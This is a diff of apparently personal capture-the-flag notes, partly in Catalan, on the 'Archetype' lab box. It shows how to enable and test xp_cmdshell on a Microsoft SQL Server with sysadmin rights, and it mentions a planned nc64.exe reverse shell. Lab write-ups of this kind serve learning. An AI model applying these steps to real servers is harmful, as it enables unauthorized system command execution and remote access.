@@ -63,49 +63,26 @@ First check what role does the user has `SELECT is_srvrolemember('sysadmin');`
 
 We can set up command execution because the user has admin privileges.
 
->  Command Execution
+>  Set up System Command Execution
 ```sql 
-EXEC sp_configure 'show advanced options', 1; — priv  
-RECONFIGURE; — priv 
-so_
-EXEC sp_configure 'xp_cmdshell', 1; — priv  
-RECONFIGURE; — priv
+SQL> EXEC sp_configure 'show advanced options', 1; — priv  
+SQL> RECONFIGURE; — priv 
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1; — priv  
+SQL> RECONFIGURE; — priv
 ```
 [//]: Found in Link 2
 [- priv]: Administrator privileges need it.
 
+Now the server permits system commands.
 
+> Test System Commands Execution
+```SQL
+SQL> xp_cmdshell "whoami"
+```
 
 # Archetype
 
-username: dbo
-system_user: sql_svc
-
-> Veure quin rol tenim
-```SQL
-SQL> SELECT is_srvrolemember('sysadmin');
-```
-1 --> True
-
-> Llistar Databases
-```sql
-SQL> EXEC sp_databases;
-```
-
-
-> Execució de commandes
-```sql
-SQL> EXEC xp_cmdshell ‘net user’;
-
-SQL> EXEC sp_configure ‘show advanced options’, 1; — priv
-
-SQL> RECONFIGURE; — priv
-
-SQL> EXEC sp_configure ‘xp_cmdshell’, 1; — priv
-
-SQL> RECONFIGURE; — priv
-```
-[priv]: S'han d'executatr amb usuari que tingui permisos d'admin
 
 !! Com que ja podem executar commandes, intentarem executar una reverse shell. (nc64.exe)
 
